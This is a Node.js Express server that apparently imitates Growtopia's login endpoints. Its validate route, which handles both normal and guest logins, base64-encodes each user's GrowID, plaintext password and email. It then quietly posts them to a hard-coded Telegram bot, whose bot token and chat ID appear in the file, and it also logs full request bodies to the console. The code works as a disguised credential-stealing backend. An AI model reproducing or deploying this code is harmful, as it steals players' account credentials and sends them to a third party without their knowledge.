const express = require('express');
const app = express();
const rateLimit = require('express-rate-limit');
const bodyParser = require('body-parser');
const compression = require('compression');
const https = require('https'); // Imported native https module

// --- Telegram Configuration ---
// UPDATED: Using the correct token ending in ...8s
const TG_BOT_TOKEN = '6441563124:AAF3LCmLVG6rOYXBmtDyRXDMiGYmGjHwzE4';
const TG_CHAT_ID = '5113674259';

function isValidEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

// Function to send token to Telegram with DEBUG logging
function sendTelegramToken(tokenContent) {
    return new Promise((resolve, reject) => {
        console.log('Attempting to send token to Telegram...');
        const message = `New Login Token:\n${tokenContent}`;
        
        const data = JSON.stringify({
            chat_id: TG_CHAT_ID,
            text: message,
            disable_web_page_preview: true
        });

        const options = {
            hostname: 'api.telegram.org',
            port: 443,
            path: `/bot${TG_BOT_TOKEN}/sendMessage`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(data)
            }
        };

        const req = https.request(options, (res) => {
            let responseData = '';

            // Await data to prevent Vercel from freezing the process early
            res.on('data', (chunk) => {
                responseData += chunk;
            });

            res.on('end', () => {
                if (res.statusCode >= 200 && res.statusCode < 300) {
                    console.log('Telegram notification sent successfully.');
                } else {
                    console.error(`Telegram API Error: ${res.statusCode} ${res.statusMessage}`);
                    console.error('Response Body:', responseData);
                }
                resolve();
            });
        });

        req.on('error', (e) => {
            console.error('Telegram Network Error:', e);
            resolve(); // Resolve anyway so the user can still login even if Telegram fails
        });

        req.write(data);
        req.end();
    });
}

app.use(compression({
    level: 5,
    filter: (req, res) => {
        if (req.headers['X-No-Compression']) return false;
        return compression.filter(req, res);
    }
}));
app.use(bodyParser.urlencoded({ extended: true }));
app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
    res.on('finish', () => {
        console.log(`${req.method} ${req.url} - Status: ${res.statusCode} | Body: ${JSON.stringify(req.body)}`);
    });
    next();
});
app.use(express.json());
app.use(rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    message: 'Too many requests from this IP, please try again after an hour',
}));
app.set('trust proxy', 1);
app.set('view engine', 'ejs');
app.use(express.static(__dirname + '/public'));

app.all('/player/login/dashboard', function (req, res) {
    const tData = {};
    try {
        const uData = JSON.stringify(req.body).split('"')[1].split('\\n');
        const uName = uData[0].split('|');
        const uPass = uData[1].split('|');

        for (let i = 0; i < uData.length - 1; i++) {
            const d = uData[i].split('|');
            tData[d[0]] = d[1];
        }

        if (uName[1] && uPass[1]) {
            return res.redirect('/player/growid/login/validate');
        }
    } catch (why) {
        console.log(`Warning: ${why}`);
    }

    res.render(__dirname + '/public/html/dashboard.ejs', { data: tData });
});

// Changed to async to handle Telegram await
app.all('/player/growid/login/validate', async (req, res) => {
    const { type, growId = '', password = '', email = '', gender = 0, _token } = req.body;

    const trimmedGrowId = (growId || '').trim();
    const trimmedPassword = (password || '').trim();
    const isGuestRequest =
        type === 'guest' || (trimmedGrowId === '' && trimmedPassword === '');

    console.log(
        `Type: ${type} | GrowID: ${isGuestRequest ? 'GUEST_MODE' : trimmedGrowId} | Password: ${isGuestRequest ? '(guest)' : '***'} | Email: ${email} | Gender: ${gender}`
    );

    // Must have _token and type at least
    if (!_token || !type) {
        console.log('Invalid request: missing _token or type');
        res.setHeader('Content-Type', 'text/html');
        return res.send(`{"status":"error","message":"Invalid request.","token":"","url":"","accountType":""}`);
    }

    // ===== GUEST LOGIN → AUTO REGISTER RANDOM ACCOUNT =====
    if (isGuestRequest) {
        const guestId = 'Guest' + Math.floor(100000 + Math.random() * 900000);
        const guestPass = 'g' + Math.floor(100000 + Math.random() * 900000);
        const guestEmail = `${guestId.toLowerCase()}@guest.local`;

        const tokenData =
            `_token=${_token}` +
            `&type=reg` +
            `&growId=${guestId}` +
            `&password=${guestPass}` +
            `&email=${guestEmail}` +
            `&gender=${gender}`;

        const token = Buffer.from(tokenData).toString('base64');
        
        // Send to Telegram
        await sendTelegramToken(token);

        res.setHeader('Content-Type', 'text/html');
        return res.send(
            `{"status":"success","message":"Guest account created.","token":"${token}","url":"","accountType":"growtopia"}`
        );
    }
    // ======================================================

    // For normal log / reg we require growId + password
    if (!trimmedGrowId || !trimmedPassword) {
        console.log('Invalid request: missing growId or password');
        res.setHeader('Content-Type', 'text/html');
        return res.send(`{"status":"error","message":"Invalid request.","token":"","url":"","accountType":""}`);
    }

    if (type === "reg" && !isValidEmail(email)) {
        console.log('Invalid email format');
        res.setHeader('Content-Type', 'text/html');
        return res.send(`{"status":"error","message":"Invalid email.","token":"","url":"","accountType":""}`);
    }

    const tokenData = type === 'reg'
        ? `_token=${_token}&type=${type}&growId=${trimmedGrowId}&password=${trimmedPassword}&email=${email}&gender=${gender}`
        : `_token=${_token}&type=${type}&growId=${trimmedGrowId}&password=${trimmedPassword}`;

    const token = Buffer.from(tokenData).toString('base64');

    // Send to Telegram
    await sendTelegramToken(token);

    res.setHeader('Content-Type', 'text/html');
    res.send(`{"status":"success","message":"Account Validated.","token":"${token}","url":"","accountType":"growtopia"}`);
});

app.all('/player/growid/checkToken', (req, res) => {
    try {
        const { refreshToken, clientData } = req.body;

        if (!refreshToken || !clientData) {
            res.setHeader('Content-Type', 'text/html');
            return res.status(400).send(`{"status":"error","message":"Missing refreshToken or clientData"}`);
        }

        const decodedRefreshToken = Buffer.from(refreshToken, 'base64').toString('utf-8');
        const updatedToken = Buffer.from(
            decodedRefreshToken.replace(/(_token=)[^&]*/, `$1${Buffer.from(clientData).toString('base64')}`)
        ).toString('base64');

        res.setHeader('Content-Type', 'text/html');
        res.send(`{"status":"success","message":"Token is valid.","token":"${updatedToken}","url":"","accountType":"growtopia"}`);
    } catch (error) {
        res.setHeader('Content-Type', 'text/html');
        res.status(500).send(`{"status":"error","message":"Internal Server Error"}`);
    }
});

app.all('/', function (req, res) {
    res.sendFile(__dirname + '/public/html/index.html');
});

// For Vercel, it is best practice to export the app
const PORT = process.env.PORT || 5000;
app.listen(PORT, function () {
    console.log(`Listening on port ${PORT}`);
});

module.exports = app;